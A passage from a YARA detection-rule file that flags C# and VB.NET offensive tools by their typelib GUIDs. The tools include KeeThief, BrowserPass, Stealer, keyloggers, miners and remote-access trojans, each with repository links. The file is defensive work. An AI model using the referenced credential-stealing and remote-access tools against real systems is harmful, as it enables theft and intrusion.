import "dotnet"
import "hash"
import "pe"

rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpsocks : FILE
{
	meta:
		description = "Detects c# red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "343061d9-e24e-5d49-939f-b94c295b17ac"
		date = "2020-12-28"
		modified = "2025-08-15"
		reference = "https://github.com/nettitude/SharpSocks"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L3583-L3597"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "477adf09ee9d04888ee5e352c11e95f855c433588771138ebb5970cae7aa044f"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "2f43992e-5703-4420-ad0b-17cb7d89c956" ascii wide
		$typelibguid1lo = "86d10a34-c374-4de4-8e12-490e5e65ddff" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharp_Wmiexec : FILE
{
	meta:
		description = "Detects c# red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "ae08a5a2-06d5-55fe-803a-7f4696220904"
		date = "2020-12-28"
		modified = "2025-08-15"
		reference = "https://github.com/checkymander/Sharp-WMIExec"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L3599-L3612"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "df683be102decfc65209195d0d2e640985dd7e7cf040fb074fb10c8749e98614"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "0a63b0a1-7d1a-4b84-81c3-bbbfe9913029" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Keethief : FILE
{
	meta:
		description = "Detects c# red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "71fef0e9-223a-5834-9d1c-f3fb8b66a809"
		date = "2020-12-28"
		modified = "2025-08-15"
		reference = "https://github.com/GhostPack/KeeThief"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L3614-L3632"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "f91aeb1862b803ae44c398a71e6c6ed0017d28206deffa39e4e0bca8faae6701"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid1lo = "39aa6f93-a1c9-497f-bad2-cc42a61d5710" ascii wide
		$typelibguid3lo = "3fca8012-3bad-41e4-91f4-534aa9a44f96" ascii wide
		$typelibguid4lo = "ea92f1e6-3f34-48f8-8b0a-f2bbc19220ef" ascii wide
		$typelibguid5lo = "c23b51c4-2475-4fc6-9b3a-27d0a2b99b0f" ascii wide
		$typelibguid7lo = "80ba63a4-7d41-40e9-a722-6dd58b28bf7e" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Fakelogonscreen : FILE
{
	meta:
		description = "Detects c# red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "cc20290c-3f34-5e81-9337-c582f1ee7ade"
		date = "2020-12-28"
		modified = "2025-08-15"
		reference = "https://github.com/bitsadmin/fakelogonscreen"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L3634-L3647"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "93353997e52fda3cebb03c2c63afc16ea477d3d5d4a7cf8dee26940ccffecd7a"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "d35a55bd-3189-498b-b72f-dc798172e505" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Poshsecframework : FILE
{
	meta:
		description = "Detects c# red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "a91620f3-3f21-525a-bc87-94d21cd126be"
		date = "2020-12-28"
		modified = "2025-08-15"
		reference = "https://github.com/PoshSec/PoshSecFramework"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L3649-L3663"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "6af81da2f23a0ad87d918e4ecb5869e8113b03e175c114e553856c4eabfacb71"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "b1ac6aa0-2f1a-4696-bf4b-0e41cf2f4b6b" ascii wide
		$typelibguid1lo = "78bfcfc2-ef1c-4514-bce6-934b251666d2" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpattack : FILE
{
	meta:
		description = "Detects c# red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "1eb911ab-3fb9-54b7-8afb-66328f30d563"
		date = "2020-12-28"
		modified = "2025-08-15"
		reference = "https://github.com/jaredhaight/SharpAttack"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L3665-L3678"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "eb2f706a8f91c0702472663d5c5672b0e0a9afa775668706377899b36bdb684c"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "5f0ceca3-5997-406c-adf5-6c7fbb6cba17" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Altman : FILE
{
	meta:
		description = "Detects c# red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "21acc8af-9497-5842-90a9-7a9300585d5d"
		date = "2020-12-28"
		modified = "2025-08-15"
		reference = "https://github.com/keepwn/Altman"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L3680-L3710"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "4d7046ac7a0deebb33a33995f4c2b9c6b65d4821262d55aecd8e00379ba93b00"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "64cdcd2b-7356-4079-af78-e22210e66154" ascii wide
		$typelibguid1lo = "f1dee29d-ca98-46ea-9d13-93ae1fda96e1" ascii wide
		$typelibguid2lo = "33568320-56e8-4abb-83f8-548e8d6adac2" ascii wide
		$typelibguid3lo = "470ec930-70a3-4d71-b4ff-860fcb900e85" ascii wide
		$typelibguid4lo = "9514574d-6819-44f2-affa-6158ac1143b3" ascii wide
		$typelibguid5lo = "0f3a9c4f-0b11-4373-a0a6-3a6de814e891" ascii wide
		$typelibguid6lo = "9624b72e-9702-4d78-995b-164254328151" ascii wide
		$typelibguid7lo = "faae59a8-55fc-48b1-a9b5-b1759c9c1010" ascii wide
		$typelibguid8lo = "37af4988-f6f2-4f0c-aa2b-5b24f7ed3bf3" ascii wide
		$typelibguid9lo = "c82aa2fe-3332-441f-965e-6b653e088abf" ascii wide
		$typelibguid10lo = "6e531f6c-2c89-447f-8464-aaa96dbcdfff" ascii wide
		$typelibguid11lo = "231987a1-ea32-4087-8963-2322338f16f6" ascii wide
		$typelibguid12lo = "7da0d93a-a0ae-41a5-9389-42eff85bb064" ascii wide
		$typelibguid13lo = "a729f9cc-edc2-4785-9a7d-7b81bb12484c" ascii wide
		$typelibguid14lo = "55a1fd43-d23e-4d72-aadb-bbd1340a6913" ascii wide
		$typelibguid15lo = "d43f240d-e7f5-43c5-9b51-d156dc7ea221" ascii wide
		$typelibguid16lo = "c2e6c1a0-93b1-4bbc-98e6-8e2b3145db8e" ascii wide
		$typelibguid17lo = "714ae6f3-0d03-4023-b753-fed6a31d95c7" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Browserpass : FILE
{
	meta:
		description = "Detects c# red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "bad36c36-dbed-527c-a2f5-4dceff1abe4b"
		date = "2020-12-28"
		modified = "2025-08-15"
		reference = "https://github.com/jabiel/BrowserPass"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L3712-L3725"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "ce5f5eaa71fd7358d99743e56a8518c1a852faa39c4a7d1888e0a218e9e7a8ef"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "3cb59871-0dce-453b-857a-2d1e515b0b66" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Mythic : FILE
{
	meta:
		description = "Detects c# red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "44237fac-1526-5587-83a1-61d7a54f7da9"
		date = "2020-12-29"
		modified = "2025-08-15"
		reference = "https://github.com/its-a-feature/Mythic"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L3727-L3741"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "3d3b942e110bbf181ecbda5d4b3c2f7775e8e9b4860722238fe686c36422d456"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "91f7a9da-f045-4239-a1e9-487ffdd65986" ascii wide
		$typelibguid1lo = "0405205c-c2a0-4f9a-a221-48b5c70df3b6" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Nuages : FILE
{
	meta:
		description = "Detects c# red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "5ad947e2-bd71-50d4-9bbf-4d018c7ff36a"
		date = "2020-12-29"
		modified = "2025-08-15"
		reference = "https://github.com/p3nt4/Nuages"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L3743-L3756"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "a0d7d89449a6a21bd118ace6a7062ff8d1fa356cf2421cc8c53f2da3719e52fb"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "e9e80ac7-4c13-45bd-9bde-ca89aadf1294" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpsniper : FILE
{
	meta:
		description = "Detects c# red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "14e6a3b8-5e1f-5dd8-9b51-22522ac317e7"
		date = "2020-12-29"
		modified = "2025-08-15"
		reference = "https://github.com/HunnicCyber/SharpSniper"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L3758-L3771"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "52ae4a89b9cca9bee19e904617ed8c78857a9cee58d691f337fd4a736798aa1e"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "c8bb840c-04ce-4b60-a734-faf15abf7b18" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharphound3 : FILE
{
	meta:
		description = "Detects c# red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "58001912-88a1-527d-9d3e-d7c376a1fce4"
		date = "2020-12-29"
		modified = "2025-08-15"
		reference = "https://github.com/BloodHoundAD/SharpHound3"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L3773-L3786"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "9de8457f59133adb09df0c40ece45331ac716fd56d58bd37a40ce7f1d0a53378"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "a517a8de-5834-411d-abda-2d0e1766539c" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Blocketw : FILE
{
	meta:
		description = "Detects c# red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "c2b72fef-6549-5b53-8ccf-232e8d152e96"
		date = "2020-12-29"
		modified = "2025-08-15"
		reference = "https://github.com/Soledge/BlockEtw"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L3788-L3801"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "8953751277594d4075907e8371764d02307209a732bb05d7cfec8141e23c7765"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "daedf7b3-8262-4892-adc4-425dd5f85bca" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpwifigrabber : FILE
{
	meta:
		description = "Detects c# red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "1a457672-743c-56f0-a4d7-6c25f9ce2345"
		date = "2020-12-29"
		modified = "2025-08-15"
		reference = "https://github.com/r3nhat/SharpWifiGrabber"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L3803-L3816"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "6984510cbc43987fee53e5b164d973f56ecdd682d9263dc7cf560ab8728769d9"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "c0997698-2b73-4982-b25b-d0578d1323c2" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Sharpmapexec : FILE
{
	meta:
		description = "Detects c# red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "b4922734-a486-5c4d-9bd7-5146cfecbf01"
		date = "2020-12-29"
		modified = "2025-08-15"
		reference = "https://github.com/cube0x0/SharpMapExec"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L3818-L3831"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "cc155390b8c739b7c96f45b79a8a078128528d6c7d070161d67484880c51a714"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "bd5220f7-e1fb-41d2-91ec-e4c50c6e9b9f" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_K8Fly : FILE
{
	meta:
		description = "Detects c# red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "3421e6fb-df65-5e2e-ae46-37f9c763c6a1"
		date = "2020-12-29"
		modified = "2025-08-15"
		reference = "https://github.com/zzwlpx/k8fly"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L3833-L3846"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "99fb07cefac5572180f5f66e9ebce39b8d17c3a2acc56dd8fea426452127be5a"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "13b6c843-f3d4-4585-b4f3-e2672a47931e" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Stealer : FILE
{
	meta:
		description = "Detects c# red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "c721a0ac-e898-52aa-9bdf-a19bc0bd783d"
		date = "2020-12-29"
		modified = "2025-08-15"
		reference = "https://github.com/malwares/Stealer"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L3848-L3863"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "37f829449b4f8a9524400d9409b985fab2ff70024a88fdd96ba391956a3398e3"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "8fcd4931-91a2-4e18-849b-70de34ab75df" ascii wide
		$typelibguid1lo = "e48811ca-8af8-4e73-85dd-2045b9cca73a" ascii wide
		$typelibguid2lo = "d3d8a1cc-e123-4905-b3de-374749122fcf" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Porttran : FILE
{
	meta:
		description = "Detects c# red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "844e58a2-54f5-51e8-8176-6a478a136603"
		date = "2020-12-29"
		modified = "2025-08-15"
		reference = "https://github.com/k8gege/PortTran"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L3865-L3879"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "f8417a677e88bd923236855d6734cbf3db864c7e3ea60a1e500554fc5946f76a"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "3a074374-77e8-4312-8746-37f3cb00e82c" ascii wide
		$typelibguid1lo = "67a73bac-f59d-4227-9220-e20a2ef42782" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Gray_Keylogger_2 : FILE
{
	meta:
		description = "Detects VB.NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "40ab8103-9151-5a5c-8b70-ab3bfd3896f9"
		date = "2020-12-30"
		modified = "2025-08-15"
		reference = "https://github.com/graysuit/gray-keylogger-2"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L3882-L3896"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "92ab6b703064beeab4ef6811732ee76d187958bf4b16f70fa062a7a71ecfb289"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "e94ca3ff-c0e5-4d1a-ad5e-f6ebbe365067" ascii wide
		$typelibguid1lo = "1ed07564-b411-4626-88e5-e1cd8ecd860a" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Lime_Miner : FILE
{
	meta:
		description = "Detects VB.NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "d0631817-10a2-55bf-a41d-226fa0dcb9f9"
		date = "2020-12-30"
		modified = "2025-08-15"
		reference = "https://github.com/NYAN-x-CAT/Lime-Miner"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L3898-L3911"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "4b7f810efd907477736f40b9537d1ad99896e28c89bd571244256c385c387bfa"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "13958fb9-dfc1-4e2c-8a8d-a5e68abdbc66" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Blacknet : FILE
{
	meta:
		description = "Detects VB.NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "9fbb3c11-7b11-5910-9c8b-247aeefbaa87"
		date = "2020-12-30"
		modified = "2025-08-15"
		reference = "https://github.com/BlackHacker511/BlackNET"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L3913-L3929"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "5e3c6e6e50888c942d541ad893b34c65f784614de7576e9a752822c433753d55"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "c2b90883-abee-4cfa-af66-dfd93ec617a5" ascii wide
		$typelibguid1lo = "8bb6f5b4-e7c7-4554-afd1-48f368774837" ascii wide
		$typelibguid2lo = "983ae28c-91c3-4072-8cdf-698b2ff7a967" ascii wide
		$typelibguid3lo = "9ac18cdc-3711-4719-9cfb-5b5f2d51fd5a" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Plasmarat : FILE
{
	meta:
		description = "Detects VB.NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "13362cba-f9b2-50c8-95cc-504e585bdd42"
		date = "2020-12-30"
		modified = "2025-08-15"
		reference = "https://github.com/mwsrc/PlasmaRAT"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L3931-L3945"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "78d0da86cdef86b06fca37fb378297df26ca792ab6069e87c19c7b075687b07d"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "b8a2147c-074c-46e1-bb99-c8431a6546ce" ascii wide
		$typelibguid1lo = "0fcfde33-213f-4fb6-ac15-efb20393d4f3" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Lime_RAT : FILE
{
	meta:
		description = "Detects VB.NET red/black-team tools via typelibguid"
		author = "Arnim Rupp (https://github.com/ruppde)"
		id = "31a0e9ca-9da1-557a-bcc5-1351fa90a0e1"
		date = "2020-12-30"
		modified = "2025-08-15"
		reference = "https://github.com/NYAN-x-CAT/Lime-RAT"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_github_net_redteam_tools_guids.yar#L3947-L3980"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "eee41a29dc6b336c14abedaad767b8a0a529917bbc9096829114f302ed93f53c"
		score = 75
		quality = 83
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$typelibguid0lo = "e58ac447-ab07-402a-9c96-95e284a76a8d" ascii wide
		$typelibguid1lo = "8fb35dab-73cd-4163-8868-c4dbcbdf0c17" ascii wide
		$typelibguid2lo = "37845f5b-35fe-4dce-bbec-2d07c7904fb0" ascii wide
		$typelibguid3lo = "83c453cf-0d29-4690-b9dc-567f20e63894" ascii wide
		$typelibguid4lo = "8b1f0a69-a930-42e3-9c13-7de0d04a4add" ascii wide
		$typelibguid5lo = "eaaeccf6-75d2-4616-b045-36eea09c8b28" ascii wide
		$typelibguid6lo = "5b2ec674-0aa4-4209-94df-b6c995ad59c4" ascii wide
		$typelibguid7lo = "e2cc7158-aee6-4463-95bf-fb5295e9e37a" ascii wide
		$typelibguid8lo = "d04ecf62-6da9-4308-804a-e789baa5cc38" ascii wide
		$typelibguid9lo = "8026261f-ac68-4ccf-97b2-3b55b7d6684d" ascii wide
		$typelibguid10lo = "212cdfac-51f1-4045-a5c0-6e638f89fce0" ascii wide
		$typelibguid11lo = "c1b608bb-7aed-488d-aa3b-0c96625d26c0" ascii wide
		$typelibguid12lo = "4c84e7ec-f197-4321-8862-d5d18783e2fe" ascii wide
		$typelibguid13lo = "3fc17adb-67d4-4a8d-8770-ecfd815f73ee" ascii wide
		$typelibguid14lo = "f1ab854b-6282-4bdf-8b8b-f2911a008948" ascii wide
		$typelibguid15lo = "aef6547e-3822-4f96-9708-bcf008129b2b" ascii wide
		$typelibguid16lo = "a336f517-bca9-465f-8ff8-2756cfd0cad9" ascii wide
		$typelibguid17lo = "5de018bd-941d-4a5d-bed5-fbdd111aba76" ascii wide
		$typelibguid18lo = "bbfac1f9-cd4f-4c44-af94-1130168494d0" ascii wide
		$typelibguid19lo = "1c79cea1-ebf3-494c-90a8-51691df41b86" ascii wide
		$typelibguid20lo = "927104e1-aa17-4167-817c-7673fe26d46e" ascii wide

	condition:
		( uint16( 0 ) == 0x5A4D and uint32( uint32( 0x3C ) ) == 0x00004550 ) and any of them
}
rule SIGNATURE_BASE_HKTL_NET_GUID_Njrat : FILE
{
	meta:
		description = "Detects VB.NET red/black-team tools via typelibguid"
